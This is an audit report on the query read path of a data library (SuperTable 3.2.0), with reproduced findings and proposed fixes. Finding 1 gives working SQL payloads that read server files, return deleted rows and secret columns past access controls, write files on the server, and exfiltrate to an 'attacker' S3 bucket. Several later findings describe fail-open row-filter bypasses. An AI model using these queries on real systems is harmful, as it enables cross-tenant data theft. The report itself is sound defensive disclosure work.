# Read-path / engine adversarial audit — SuperTable 3.2.0

Scope: `data_reader.py`, `engine/` (duckdb, executor, engine_common, data_estimator,
arrow_result, spark_thrift), `utils/sql_parser.py`, predicate extraction + file pruning,
the reflection→tombstone→RBAC view chain, `streaming/`.

Method: every finding below was attacked before it was written down. Reproductions ran
against a hermetic `STORAGE_TYPE=LOCAL` + fakeredis harness built from
`tests/characterization/harness.py`, using the real `DataWriter`/`DataReader`. PROVEN
means a script reproduced it; REASONED means I could only trace the call path.
`engine/join_pruner.py` named in the brief **does not exist in this tree** (it was part of
the rolled-back 2.5/2.6 line) — nothing to audit there.

---

## 1. Any role can read arbitrary files and write arbitrary files — RBAC, deletion vector and tenant isolation are all bypassable from plain SQL

**SEVERITY: critical — PROVEN**

`supertable/system_query.py:82-135` (`classify_query`), `supertable/data_reader.py:214-222`,
`supertable/engine/duckdb.py:358`, `supertable/engine/engine_common.py:654-774` (`init_connection`).

`classify_query`'s docstring says "The read path is intentionally restricted: `DataReader`
only resolves and runs queries that read existing data", and claims the old implicit
enforcement was that "anything that wasn't a `SELECT` failed somewhere downstream
(… `SQLParser` raised 'No tables found')". That premise is false. The only gate is
`SQLParser._extract_tables` (`sql_parser.py:328-339`), which raises **only when the
statement mentions no table at all**. Any statement that mentions one real table passes
classification untouched, is rewritten by `rewrite_query_with_hashed_tables` and handed
verbatim to `cursor.execute()` on a DuckDB connection that has `enable_external_access`
left at its default (true), no `disabled_filesystems`, no `lock_configuration`, and — on
object-store deployments — the server's S3 credentials already `SET` on it by
`configure_httpfs_and_s3`.

Reproduced against a role restricted to `{"orders": {"columns": ["id"]}}`, on a table where
`id=2` had been tombstoned:

| query | result |
|---|---|
| `SELECT * FROM orders` (the intended path) | `[(1,), (3,)]` — column filter + DV applied |
| `SELECT * FROM orders, read_csv('/etc/hostname', header=false)` | returned the contents of `/etc/hostname` |
| `SELECT p.* FROM read_parquet([<data file>]) p WHERE EXISTS (SELECT 1 FROM orders)` | returned `id`, **`secret`**, **`__rowid__`**, **`__timestamp__`** and the **deleted row `id=2`** |
| `COPY (SELECT * FROM orders) TO '/tmp/pwn.csv'` | `Status.OK`; `/tmp/pwn.csv` created on the server |

The `read_parquet` row is the whole security model defeated in one line: column-level RBAC,
the row filter, the linked-share `_row_filter`, and the deletion vector are all properties of
the *view chain*, and the view chain is only applied to table references the parser
recognised. A table function is not one.

**Why existing guards miss it.** `restrict_read_access` validates
`SQLParser.get_physical_tables()` — table functions never appear there. `_assert_targets_exist`
checks the same list. The view chain is keyed by alias. Nothing inspects the AST for
non-table leaf sources or for a non-SELECT root node. `CREATE TABLE x AS SELECT …` is only
blocked by accident (`_assert_targets_exist` fails on the not-yet-existing `x`); `COPY … TO`
has no such accident.

On MinIO/S3 (the repo's own `.env`) this is cross-tenant: `read_parquet('s3://bucket/<other-org>/…')`
runs with the server's credentials, and `COPY … TO 's3://attacker/…'` exfiltrates.

**FIX PROPOSAL.** Two independent layers, because either alone is bypassable:
1. *Allow-list the AST, not the prefix.* In `classify_query` (or a new validator called from
   `DataReader.execute` before RBAC), require the parsed root to be `exp.Select`/`exp.Union`/
   `exp.With`, and walk every `exp.Table`/FROM leaf: each must be a bare identifier that
   resolves to a catalog table or a CTE defined in the same statement. Reject any
   `exp.Anonymous`/table-function source, any `exp.Copy`/`exp.Create`/`exp.Insert`/`exp.Delete`/
   `exp.Update`/`exp.Command`/`exp.Attach`/`exp.Pragma`/`exp.Set` node anywhere in the tree.
   This is the layer that makes RBAC meaningful.
2. *Sandbox the engine.* In `init_connection`, `SET enable_external_access` cannot simply be
   turned off (the reflection views need parquet reads), but DuckDB's `disabled_filesystems`
   and, better, moving file access behind pre-created views on a connection that then does
   `SET lock_configuration=true` closes the residual surface. At minimum, disable the
   `COPY … TO` path by refusing any statement whose root is not a query.
   Add a regression test per row of the table above.

---

## 2. String predicates prune unsoundly: the engine compares case-insensitively, the pruner compares byte-wise

**SEVERITY: critical — PROVEN**

`supertable/engine/engine_common.py:728` — `con.execute("PRAGMA default_collation='nocase';")`
vs `supertable/processing.py:2427-2428` — `elif p_lane == "string" and s_lane == "string": smin, smax, plo, phi = s_min, s_max, pred.lo, pred.hi`
and the Python `<`/`>` comparisons at `processing.py:2453-2471`.

Every DuckDB read runs with `default_collation='nocase'`, so `WHERE name = 'BANANA'` genuinely
matches a stored `'banana'`. The file pruner decides which files to even open by comparing the
predicate literal against the stats `min_string`/`max_string` with ordinary Python string
comparison, which is case-**sensitive** (`'BANANA' < 'apple'`). Any file whose min/max are in a
different case than the literal is proved "cannot match" and dropped — while the engine would
have matched rows in it.

Reproduced: three files — `["apple","banana"]`, `["AAA","ZZZ"]`, `["CARROT"]`.

```
MISMATCH SELECT name, src FROM people WHERE name = 'BANANA' ORDER BY name
   pruned  : []
   fullscan: [('banana', 'lower')]
MISMATCH SELECT name, src FROM people WHERE name = 'Banana' ORDER BY name
   pruned  : []
   fullscan: [('banana', 'lower')]
MISMATCH SELECT count(*) n FROM people WHERE name >= 'BANANA' AND name <= 'BANANB'
   pruned  : [(0,)]
   fullscan: [(1,)]
```

Silent wrong answer, `Status.OK`, no warning. Any mixed-case corpus (emails, product SKUs,
country codes ingested from two source systems) triggers it.

**Why existing guards miss it.** The `if not kept: return file_keys` guard at
`processing.py:2550-2551` masks it whenever *every* file is excluded — which is what happens on
a small uniform-case table, and is why the 4,388-query corpus is silent: I ran the equivalent
shapes (`WHERE cat = 'FOOD'`, `WHERE country = 'at'`) against a 8-file/3-file dataset and got 0
mismatches purely because the guard fired. The bug needs at least one file whose byte range
straddles the literal. `supertable/tests/pruning/queries.py` never varies literal case.

**FIX PROPOSAL.** The pruner must use the same collation as the engine. Cheapest correct fix:
when the predicate lane is `string`, casefold **both** the predicate bounds and the stored
min/max before comparing — but that is only sound if the stored min/max were *also* computed
under the same folding, which they are not (they come from the parquet footer, binary-ordered).
So the honest fix is to widen instead of fold: for a `string` lane, expand the interval to
`[min(lo, lo.lower(), lo.upper()), max(hi, hi.lower(), hi.upper())]` before comparing, matching
the existing `_widen_naive_timestamp_bounds` precedent at `processing.py:2352` ("pruning may
keep a file it did not need to; it may never drop one it did"). Alternatively, drop
`default_collation='nocase'` — but that is a behaviour change for every existing query and
would silently alter results, so widening is the safe move. Seal it with a corpus family that
varies literal case independently of stored case.

---

## 3. Integer predicates prune unsoundly above 2^53: stats are compared as float64

**SEVERITY: high — PROVEN**

`supertable/processing.py:2420-2423`:

```python
    if p_lane == "numeric" and s_lane in ("bigint", "double"):
        smin, smax = float(s_min), float(s_max)
        plo = None if pred.lo is None else float(pred.lo)
        phi = None if pred.hi is None else float(pred.hi)
```

Both the stored int64 range and the predicate bound are pushed through `float`. Above 2^53 the
ulp exceeds 1, so a file whose whole range rounds onto the same float as an *exclusive* bound
collapses to `low == high` with `low_incl=False`, and `_pred_overlaps_stored` returns False
(`processing.py:2467-2471`) — the file is dropped even though it holds matching rows.

Reproduced, 2^60-scale ids:

```
SELECT count(*) n FROM nums WHERE big > 1152921504606846976
  pruned   = 1     fullscan = 2      (row from the file holding 2**60+1 lost)
```

and with realistic epoch-nanosecond bigints (`1767225600000000000`, a Kafka/OTel `ts_ns`
column), a file spanning 30 ns:

```
  > 1767225600000000000:  pruned=1  fullscan=3   MISMATCH
```

This is the keyset-pagination shape (`WHERE id > :last_seen_id`) applied to snowflake ids, and
the epoch-nanosecond shape. Only strict `>`/`<` are affected — `>=`/`<=`/`=` stay inclusive on
both sides and survive.

**Why existing guards miss it.** `supertable/tests/pruning/dataset.py` contains no value above
2^53 (grep for `2**5x` / 16-digit literals returns nothing), so the corpus cannot express the
input that breaks it.

**FIX PROPOSAL.** Branch on the stored lane instead of coercing everything to float. When
`s_lane == "bigint"` and every predicate bound is an `int`, compare in Python `int` (arbitrary
precision) — zero risk, and it is the common case. Keep the float path only for the genuinely
mixed `bigint` × float-literal and `double` cases, and there widen rather than round: use
`math.floor`/`math.ceil` on the predicate bound in the direction that can only *retain* files.
Add a corpus family with ids in the 2^60 range and a `>`/`<` cursor predicate.

---

## 4. The deletion vector and the linked-share row filter are fail-open on a single Redis hiccup

**SEVERITY: high — PROVEN**

`supertable/data_reader.py:318-377`. Structure:

```python
for td in tables:
    payload = None                                     # :322
    try:
        leaf = catalog.get_leaf(...)                   # :327
        payload = (leaf or {}).get("payload") ...
        if isinstance(payload, dict):
            tomb_path = payload.get("tombstone")       # DV pointer
            ...
    except Exception as te:
        logger.debug(... "[tombstone] leaf lookup failed ...")   # :352  DEBUG
    try:
        if isinstance(payload, dict):
            share_row_filter = payload.get("_row_filter")        # :359
            ...
    except Exception as rf_err:
        logger.debug(...)                              # :374
```

This one `get_leaf` call is the **only** place the deletion-vector pointer is resolved, and the
**only** place the provider-set share row filter is read. If it raises, `payload` stays `None`,
both are skipped, and the query proceeds and returns `Status.OK`.

Reproduced by making `RedisCatalog.get_leaf` raise (a transient blip — this deployment runs
Redis Sentinel, and the estimator's `scan_leaf_items` is a *separate* round trip that can
succeed while this one fails):

```
after delete:                 [1, 3, 4]
PROBE A  get_leaf raises ->   Status.OK  None  [1, 2, 3, 4]     # deleted row resurrected
```

Deleted data returned as live, `Status.OK`, and the only trace is a **DEBUG**-level line that is
invisible at the default log level. The same failure drops a share's `_row_filter`, which is a
security control (`odata/policy.py:159-181` documents `DataReader.execute` as reading it "from
exactly there"). The outer handler at `:377` is the same shape one level up, logged at WARNING
but still continuing.

**Why existing guards miss it.** There is no post-condition anywhere asserting "a table whose
snapshot declares a tombstone must have produced a `TombstoneDef`". The executor treats a
missing entry as "no deletes exist", which is indistinguishable from "lookup failed".

**FIX PROPOSAL.** Make DV/share-filter resolution fail-**closed**. Move the `get_leaf` call out
of the best-effort block and let it raise into the `except Exception` that already converts to
`(empty, Status.ERROR, message)` — a failed read is strictly better than a wrong one. If a
retry is wanted, wrap only the call in the existing transient-retry helper. Separately, the
estimator already reads each leaf's `payload` while collecting snapshots
(`data_estimator.py:459-473` keeps `payload` on every item) — plumbing the tombstone pointer out
of the reflection removes the second round trip *and* the second failure point entirely.

---

## 5. `SELECT *` over a join with a shared column name hard-fails — and `stream()` and `execute()` disagree

**SEVERITY: high — PROVEN** (regression, introduced by 3b71bfa "read results are polars, not pandas")

`supertable/engine/arrow_result.py:104-108` (`pl.from_arrow`), reached from
`materialize` (`:88-104`) which is the only buffered path since b896aaf.

polars forbids duplicate column names; pandas did not. DuckDB happily returns two `id` columns
for `SELECT * FROM a JOIN b ON a.id = b.id`, the Arrow reader carries them fine, and then the
conversion throws.

```
STREAM  : ['id', 'z', 'id', 'w'] rows= 2          <-- works
EXECUTE : Status.ERROR 'column appears more than once; names must be unique: ["id"]'
polars  : polars.exceptions.DuplicateError
```

Also fails for `SELECT * FROM a, b WHERE a.id=b.id`. Works for `USING (id)` and for
`SELECT a.*, b.w`. Plain DuckDB returns `[(1, 9, 1, 'p')]` for the same shape.

Two defects in one: (a) the single most common join query in existence now errors; (b) it is a
**streamed-vs-buffered divergence** — `stream()` returns the rows, `execute()` errors — which
directly contradicts `duckdb.py:264-272` ("Buffering is now a consumer … there is one way to
read") and `data_reader.py:486-491` ("a streamed read returns exactly what a buffered read
would"). The divergence is real, it just lives one layer below where the comment looks.

**FIX PROPOSAL.** De-duplicate at the Arrow→frame boundary in `arrow_result.batches_to_polars`:
before `pl.from_arrow`, detect repeated field names in the schema and rename the 2nd..nth
occurrence with a deterministic suffix (`id`, `id_1`, …), the way DuckDB's own `fetchdf` and
most SQL clients do. Do the renaming on the `pa.Schema` and `cast`, so the streaming path can
share the identical helper — otherwise you have just moved the divergence. Add a
characterization scenario for `SELECT *` over a join on a shared column name.

---

## 6. RBAC row-level security is unusable with any projected query

**SEVERITY: high — PROVEN**

`supertable/engine/duckdb.py:326-337` builds each reflection view from *only the columns the
query mentions*; `engine_common.py:406-424` (`_reflection_select_cols`) emits exactly those.
`engine_common.py:1222-1231` (`create_rbac_view`) then appends `WHERE <role filter>` on top of
that already-narrowed relation. If the filter names a column the query did not select, the
column is not in the view and DuckDB refuses to bind.

Role `eu_only` with filter `region = 'EU'` on `orders(id, region, amount)`:

| query | result |
|---|---|
| `SELECT * FROM orders` | OK — `[(1,'EU',10.0), (3,'EU',30.0)]` |
| `SELECT id, region FROM orders` | OK |
| `SELECT count(*) FROM orders` | OK (star semantics) |
| `SELECT id, amount FROM orders` | **ERROR** `Binder Error: Referenced column "region" not found in FROM clause!` |
| `SELECT sum(amount) FROM orders` | **ERROR** — same |

So row-level security works only when the query happens to project the filter column or uses
`SELECT *`. `SELECT sum(amount) FROM orders` — the canonical restricted-analyst query — is a hard
error. The identical failure hits the linked-share `_row_filter` injected at
`data_reader.py:359-372`, i.e. the data-sharing path.

It fails *closed*, so it is not a leak; it is an availability bug that makes the feature
unusable, and it is the kind of bug that gets "fixed" in the field by widening
`allowed_columns` to `["*"]`, which is a leak.

**FIX PROPOSAL.** The reflection projection must be the union of (query columns ∪ RBAC filter
columns ∪ share-filter columns ∪ system columns). `RbacViewDef` already flows into the engine
on `reflection.rbac_views`; extract the identifiers from `where_clause` (`FilterBuilder` builds
it from a structured dict, so the cleanest route is to have `restrict_read_access` return the
filter's column set alongside the clause rather than re-parsing SQL) and union it into `cols`
in `DuckDBEngine.stream` before `hashed_table_name`/`create_reflection_view`. The RBAC view's
own `SELECT` list already restricts the output, so the extra column never reaches the caller.
Mirror in `spark_thrift`. Seal with the four-query table above.

---

## 7. Spark: the RBAC row filter is emitted in DuckDB quoting and degenerates to a constant — full row-filter bypass

**SEVERITY: high — REASONED** (both halves verified from code; not run against a live Thrift server)

`supertable/rbac/filter_builder.py:13-18` double-quotes every identifier. Verified output:

```
FilterBuilder emits: 'SELECT *\nFROM __P__\nWHERE "region" = \'EU\''
negated            : 'SELECT *\nFROM __P__\nWHERE "region" != \'EU\''
```

`supertable/engine/spark_thrift.py:241-249` injects that clause **raw** into Spark SQL:

```python
    where_sql = ""
    if rbac_view_def.where_clause:
        where_sql = f" WHERE {rbac_view_def.where_clause}"
```

With `spark.sql.ansi.enabled` at its default (grep confirms it is never set anywhere in the
repo), Spark treats a double-quoted token as a **string literal**, not an identifier. So:

* `"region" = 'EU'` → `'region' = 'EU'` → constant FALSE → the restricted role sees **zero rows**;
* `"region" != 'EU'` → constant TRUE → **the row filter is gone; the role sees every row**.
  `!=`, `<>`, `NOT LIKE`, `NOT ILIKE`, `IS NOT`, `NOT IN`, `NOT BETWEEN` are all in
  `filter_builder._ALLOWED_OPS`.

The same function two lines earlier gets the *column* projection right (`` f"`{c}`" ``,
`spark_thrift.py:237-239`), and the file already contains both a sqlglot transpiler
(`_spark_rewrite_query`, `:472`) and a `_double_quotes_to_backticks` fallback (`:512`) — neither
is applied to the WHERE clause. The existing test passes a hand-written unquoted clause
(`engine/tests/test_engine.py:1660`, `where_clause="org = 1"`), which is not the shape
`FilterBuilder` produces, so it asserts on a string the product never generates.

**FIX PROPOSAL.** Stop shipping dialect-specific SQL through `RbacViewDef`. Either (a) have
`FilterBuilder` emit a dialect-neutral sqlglot AST and let each engine render it, or (b) at
minimum run `where_clause` through the same `_spark_rewrite_query` transpile the user query
gets, and make the fallback `_double_quotes_to_backticks` mandatory rather than optional. Add a
test that asserts the *generated* clause (from `FilterBuilder`, not a literal) survives the
Spark renderer with the identifier still an identifier.

---

## 8. Spark: a swallowed `DESCRIBE` disables the deletion vector and leaks `__rowid__`/`__timestamp__`

**SEVERITY: high — REASONED** (verified from code)

`supertable/engine/spark_thrift.py:274-317`:

```python
    try:
        cursor.execute(f"DESCRIBE {source_table}")
        src_cols = [row[0] for row in cursor.fetchall()]
    except Exception:
        src_cols = []
    user_cols = [c for c in src_cols if c not in _SPARK_SYSTEM_COLS]
    if user_cols:
        select_cols = ", ".join(f"src.`{c}`" for c in user_cols)
    else:
        select_cols = "src.*"          # system columns may leak
    ...
    has_rowid = "__rowid__" in src_cols
    if tomb_path and has_rowid:        # ← anti-join only inside this branch
```

One swallowed, unlogged exception does two things at once: `has_rowid` goes False so the
`else` branch at `:313` builds a view with **no ANTI JOIN** (every tombstoned row returned), and
`user_cols` is empty so the projection falls back to `src.*` (system columns leaked). The
result is a successful query with silently wrong, over-broad data.

The DuckDB engine deliberately has no such dependency: `create_tombstone_view`
(`engine_common.py:1301-1341`) applies the anti-join whenever `tomb_parts` is non-empty and
uses a static `COLUMNS(c -> c NOT IN (...))` predicate precisely so it needs no schema
introspection. Spark reintroduced the introspection and made it fail-open.

**FIX PROPOSAL.** Remove `has_rowid` from the guard — gate the anti-join on `tomb_path` alone,
matching DuckDB; if `__rowid__` is genuinely absent the query *should* fail. Let the `DESCRIBE`
exception propagate instead of defaulting to `[]` (a view whose projection cannot be determined
must not be built). If a tolerant projection is still wanted, use Spark's
`SELECT * EXCEPT (__rowid__, __timestamp__)`, which needs no introspection.

---

## 9. `EXPLAIN` is silently dropped on the streaming path — the query runs for real

**SEVERITY: medium — PROVEN**

`supertable/data_reader.py:395-404` calls `executor.stream(...)` without `explain=` /
`explain_options=`, while the buffered call 30 lines below (`:433-443`) passes both.
`Executor.stream` accepts them (`executor.py:164-165`) and `DuckDBEngine.stream` applies the
prefix (`duckdb.py:249-253`); they just never arrive.

```
execute(EXPLAIN): Status.OK (1, 2) ['explain_key', 'explain_value']
stream (EXPLAIN): ['id'] rows= 6000
```

`classify_query` has already stripped the `EXPLAIN` keyword (`system_query.py:127-131`), so the
stream executes the bare SELECT. Via `streaming/runner.submit_and_run`, "EXPLAIN this query
before I run it" becomes a full table scan spilled to object storage.

**FIX PROPOSAL.** Pass `explain`/`explain_options` through the stream branch — one-line parity.
Better, fold the two call sites into one that builds the kwargs once and differs only in
`stream` vs `execute`, so the next parameter added cannot diverge again. Seal with a test that
asserts `stream("EXPLAIN …")` yields plan rows, not data rows.

---

## 10. The documented `SUPERTABLE_DUCKDB_MATERIALIZE=table` escape hatch breaks every query after the first

**SEVERITY: medium — PROVEN**

`engine_common.py:441` creates the reflection with `CREATE TABLE {table_name} AS` (no
`OR REPLACE`), while teardown at `duckdb.py:455` is `DROP VIEW IF EXISTS {view}` — which never
removes a table. `engine_common.py:531-533` documents the switch as the supported revert.

```
MATERIALIZE = table
run 0: Status.OK  [(3,)]
run 1: Status.ERROR Catalog Error: Table with name "st_e0aefa3e6c54ae96" already exists!
run 2: Status.ERROR Catalog Error: ...
```

Also leaks a materialised copy of every table on the shared per-thread connection, forever.

**FIX PROPOSAL.** `CREATE OR REPLACE TABLE` in `create_reflection_table`, and make teardown
type-agnostic (`DROP VIEW IF EXISTS` followed by `DROP TABLE IF EXISTS`, or record the object
kind alongside the name in `created_views`). Or delete the switch — it has no test coverage and
is demonstrably untried.

---

## 11. `_ensure_sql_limit` emits invalid SQL for a query ending in a semicolon

**SEVERITY: medium — PROVEN**

`supertable/data_reader.py:523-530`: the check is performed on `stripped` (semicolon removed)
but the append is performed on the untouched `sql`:

```python
    stripped = sql.rstrip().rstrip(";").rstrip()
    ...
    return f"{sql}\nLIMIT {int(default_limit)}"
```

```
'SELECT * FROM t;'    -> 'SELECT * FROM t;\nLIMIT 100'      # parse error
'SELECT * FROM t;\n'  -> 'SELECT * FROM t;\n\nLIMIT 100'    # parse error
```

`query_sql` is the MCP/tool entry point, where a pasted trailing semicolon is routine.

**FIX PROPOSAL.** Append to `stripped`, not `sql`. (And consider applying the limit through
sqlglot — `parsed.limit(n)` — rather than string concatenation, which also fixes the
`... LIMIT 5 OFFSET 2` / trailing-comment edges.)

---

## 12. An unqualified column in a multi-table query is dropped from the projection and the query fails to bind

**SEVERITY: medium — PROVEN**

`sql_parser.py` documents the rule at `:196-199` ("If multiple tables exist, unqualified columns
are ignored as ambiguous"). But the column list is not advisory — it *is* the reflection view's
projection (`duckdb.py:326-337` → `_reflection_select_cols`). An ignored column is an absent one.

```
SELECT a.id, b.w FROM a JOIN b ON a.id=b.id WHERE z > 7
  -> Status.ERROR  Binder Error: Referenced column "z" not found in FROM clause!
```

`z` exists only in `a`, so the SQL is unambiguous and valid; the library rejects it. Fails
closed. (Identical shape to finding 6 — both are "the projection is narrower than the query
needs".)

**FIX PROPOSAL.** When a scope has more than one source and a column cannot be attributed,
either (a) attribute it to *every* candidate alias (over-projection is free — the tombstone and
RBAC views re-narrow), or (b) fall back to `[]` ("all columns") for that table. (a) is
preferable; (b) is a one-line safety net. Same underlying fix shape as finding 6: make the
reflection projection a conservative superset.

---

## 13. Spark: `UNION ALL` is positional where DuckDB uses `union_by_name`

**SEVERITY: medium — REASONED** (verified from code)

`spark_thrift.py:202` and `:216` join the per-file views with `UNION ALL`, which matches columns
by ordinal. `engine_common.py:443-444` / `:512-513` scan with `union_by_name=TRUE`. The repo's
own characterization suite has a scenario for exactly this — `schema_reordered_columns`
(`tests/characterization/scenarios.py:895-907`, "union_by_name matches by name so values stay
aligned") — so heterogeneous column order across a snapshot's files is a *supported* state.
Through Spark, that scenario returns values under the wrong column names, with no error.
Sibling scenarios with differing column *counts* fail loudly instead.

**FIX PROPOSAL.** Either scan all files in one `CREATE … USING parquet OPTIONS (paths '[...]')`
(Spark's parquet source merges by name and removes finding 18's RPC storm at the same time), or
explicitly project a name-ordered column list into each branch before the union.

---

## 14. Spark: `return` inside `finally` swallows the in-flight exception and leaks the connection and every temp view

**SEVERITY: medium — REASONED** (Python semantics confirmed locally)

`spark_thrift.py:1113-1114`:

```python
        finally:
            _timed_out.set()
            if handed_to_stream:
                return
```

`handed_to_stream = True` is set at `:1074`, *before* `SparkStreamHandle(...)` is constructed at
`:1079`. If the constructor raises, the `return` in `finally` discards the propagating
exception, `execute()` returns `None` to the caller, and the cursor, connection and all
part/batch/tscast/tomb/rbac temp views are never torn down. DuckDB's equivalent path
(`duckdb.py:367-374`) constructs a throwaway `StreamHandle` to tear down and then re-raises.

**FIX PROPOSAL.** Set `handed_to_stream` only *after* the handle is successfully constructed,
and replace the `return` with a guarded cleanup block so an exception can always propagate.

---

## 15. Streaming jobs: the documented backpressure invariant does not hold, and cancel silently drops a chunk

**SEVERITY: medium — REASONED** (verified from code + settings)

* `streaming/jobs.py:28-33` and `streaming/runner.py:341-344` both state that an unacknowledged
  producer is capped at `SUPERTABLE_STREAM_MAX_AHEAD_CHUNKS` chunks ("a producer with no reader
  should not be able to fill the object store"). `settings.py:358` defaults it to **0**, and
  `runner.py:281` is `while max_ahead and ...` — so the shipped default is *no backpressure*.
  The documented fallback, `SUPERTABLE_STREAM_MAX_SPILL_BYTES`, is also **0** (`settings.py:362`).
  A `SELECT * FROM huge` job writes the entire result to object storage bounded only by the
  3600 s deadline — the exact failure `jobs.py:28-33` says the design prevents.
* `runner.py:330-334` — `_safe_flush` takes five arguments, uses none, and `return`s. Its
  docstring argues that a cancelled job keeps what it produced; the body discards up to 32 MB of
  already-materialised, **already-row-counted** batches. Rows dropped here were counted into
  `handle.rows_streamed` (`duckdb.py:420`), so every cancelled job over-reports its row count to
  monitoring.
* `runner.py:61,90` — `_SHUTTING_DOWN` is a module-level `threading.Event` that is `set()` and
  never `clear()`ed. One `shutdown()` call poisons the process: every later `run_job` dies on
  its first batch (`runner.py:265-266`) while `submit_and_run` keeps creating Redis records.
  `supertable/tests/test_streaming.py:537` reaches into the private global to un-break it, which is
  the tell.
* `runner.py:109-113` — `shutdown()` only joins jobs that registered a `"thread"`, which happens
  only in `submit_and_run` (`:451`). A job started by calling `run_job` directly is cancelled
  and then *not* joined, while `shutdown` reports it as stopped.
* `runner.py:386,421-422` — `started` is assigned once, so `iter_job_batches`' "no new chunks
  within {timeout}s" actually measures total elapsed time and can kill a perfectly healthy
  long-running read.

**FIX PROPOSAL.** Pick a real default for one of the two bounds (a spill cap in bytes is the
less surprising of the two) and make the docstrings match the code. Delete `_safe_flush` or
implement it — a no-op with a five-argument signature and an opposing docstring is worse than
neither. Make `_SHUTTING_DOWN` an instance of a small runner object, or `clear()` it at the end
of `shutdown()`. Register the thread in `run_job` itself, not only in `submit_and_run`. Reset
`started` on every yielded ref.

---

## 16. PERFORMANCE: the pruning index is rebuilt row-by-row in Python on every query

**SEVERITY: medium (perf) — PROVEN (measured)**

`supertable/processing.py:2528-2534`:

```python
    needed = stored_stats_df.filter(polars.col("column_name").is_in(constrained_cols))
    for row in needed.iter_rows(named=True):
        index.setdefault(fp, {}).setdefault(rg, {})[col] = _stored_lane(row)
```

`iter_rows(named=True)` materialises a Python dict per (file × row-group × constrained column),
and `_stored_lane` does 8 dict lookups on each. Measured, isolating the two halves:

```
files=  100  stats_rows=  16,000  needed=   800 | polars filter  27.5 ms | python index   5.7 ms
files= 1000  stats_rows= 160,000  needed= 8,000 | polars filter   9.0 ms | python index  49.8 ms
files= 2000  stats_rows=1,280,000 needed=32,000 | polars filter  15.4 ms | python index 241.8 ms
```

242 ms of pure interpreter time per query on a 2000-file table, before a single byte of data is
read. The input is the stats frame (immutable, already memoised by `_STATS_CACHE` on an
immutable versioned path) and the constrained-column set; the output is a pure function of
both, and is rebuilt identically for every query. The write path has the same loop at
`processing.py:2262`.

**FIX PROPOSAL.** Two options, in increasing order of payoff:
1. Memoise the index keyed by `(stats_path, tuple(constrained_cols))` next to `_STATS_CACHE` —
   the stats path is already the cache's immutability guarantee, so correctness is free.
2. Do the predicate evaluation in polars instead of Python: the whole "does any row group of
   this file overlap every constrained column's interval" question is a `group_by("file_path")`
   over boolean expressions. That removes the Python loop entirely and scales with polars, not
   with the interpreter. The interval logic must then be expressed per lane, which is more work
   but eliminates both this and the write-path twin.

Also: `p.add("read_pruned_files", pruned)` at `:2552` sits *after* the `if not kept: return`
early-out at `:2550`, so the "we pruned everything and backed off" case is invisible in
telemetry — which is exactly the case that masks findings 2 and 3.

---

## 17. PERFORMANCE: per-query work that is per-process invariant

**SEVERITY: low/medium (perf) — PROVEN (counted)**

Instrumented counts for one simple query (`SELECT g, count(*) FROM t WHERE id > 500 GROUP BY g`)
on a warm 6-file table:

```
   14  redis commands total
    6  RedisCatalog()          <-- six separate catalog objects for one read
    2  sqlglot.parse_one
    1  RoleManager()
    1  configure_httpfs_and_s3
```

* Six `RedisCatalog()` constructions: `_assert_targets_exist` (`data_reader.py:96`),
  `DataEstimator.__init__` (`data_estimator.py:155`), the tombstone loop
  (`data_reader.py:317`), `Executor._get_catalog` (`executor.py:37`), plus RBAC's. One handle
  threaded through would do. (The underlying client is cached, so this is object churn plus
  redundant round trips, not reconnects.)
* `configure_httpfs_and_s3` is called from `_ensure_httpfs` behind a once-per-connection guard
  (`duckdb.py:131-137`) **and** unconditionally from
  `create_reflection_view_with_presign_retry` (`engine_common.py:542`) — once per table per
  query. On object storage that path runs `SELECT name FROM duckdb_settings()` (~150 rows into
  Python) plus a dozen `SET` statements every time, all of which are process-invariant. It
  returns early only because LOCAL paths contain no `s3://`.
* `sqlglot.parse_one` runs twice per query: once in `SQLParser` with the engine dialect, once in
  `rewrite_query_with_hashed_tables` (`engine_common.py:577`) with **no dialect at all**, then
  re-rendered as `duckdb`. Besides the cost, the second parse is a correctness risk for
  dialect-specific syntax, and its failure path returns the *original* SQL with un-rewritten
  table names. Reuse `SQLParser._parsed` (deep-copied) instead of re-parsing.

**FIX PROPOSAL.** Thread one `RedisCatalog` through `DataReader.execute` into the estimator,
RBAC and executor. Hoist the httpfs/S3 configuration behind the existing
`_shared_state()["httpfs"]` flag — `create_reflection_view_with_presign_retry` only needs to
re-run it on the presign retry branch. Share the parsed AST between `SQLParser` and the
rewriter.

---

## 18. PERFORMANCE (Spark): per-row transposition and an RPC storm

**SEVERITY: medium (perf) — REASONED** (verified from code)

* `spark_thrift.py:1218-1231` — PyHive receives columnar Thrift results and transposes them to
  rows (`pyhive/hive.py:506-509`); `_to_batch` then transposes them *back* with `zip(*rows)` and
  copies each column again with `list(col)`. Three full O(rows×cols) Python-object passes per
  batch (65,536 rows by default), plus one `fetchone` call per row. The `list(...)` wrappers are
  pure waste — `pa.array` accepts a tuple. DuckDB's equivalent (`duckdb.py:359-361`) hands back a
  native `RecordBatchReader` with zero per-row Python.
* `spark_thrift.py:182-224` — one `CREATE TEMPORARY VIEW` RPC **per file**, plus one per batch of
  50 (`settings.py:223`), plus one target view; a 500-file snapshot is ~511 blocking Thrift round
  trips before the query starts, and ~511 more to drop them. DuckDB does it in one
  `parquet_scan([...])`.
* `spark_thrift.py:382` — the function documented as reading "footer only" calls
  `storage.read_bytes(rel_key)`, downloading the *entire* first parquet object per `execute()`
  (the `_ts_units_cache` is a local, discarded when the method returns).
* Spark type mapping crashes on real data: `DATE_TYPE → pa.date32()` (`:1157`) while PyHive
  leaves DATE as `str` (no `DATE_TYPE` entry in `pyhive/hive.py:110-111`), and
  `DECIMAL → decimal128(38, 18)` (`:1181`) ignores the real precision/scale. Both reproduced
  locally against the installed pyarrow:
  `pa.array(['2024-01-01'], type=pa.date32())` → `ArrowTypeError`;
  `pa.array([Decimal('0.1234567890123456789')], type=pa.decimal128(38,18))` → `ArrowInvalid`.

---

## What I checked and found CLEAN

I attacked and failed to break the following, and record them so the next auditor does not
repeat the work.

**Pruning soundness, everything except the two lanes above.** I ran a 39-query differential
(pruned vs `fullscan=True`, comparing status *and* rows) over an 8-file fact table plus a 3-file
dimension, covering: all four stats lanes; `BETWEEN`/`IN`/`NOT IN`/`<>`/`NOT (...)`; OR-branches;
`UNION ALL` with the same table constrained differently in each branch; self-joins with
per-alias predicates; CTEs, including a CTE that arithmetically shifts the column the outer
`WHERE` filters on (`WITH c AS (SELECT id + 100000 AS id FROM facts) … WHERE id > 100000` — the
occurrence bookkeeping handles it); `EXISTS` / `NOT EXISTS` / `IN (subquery)` correlated
subqueries; `LEFT`/`RIGHT`/`FULL OUTER` joins with the predicate in `WHERE` vs in `ON`;
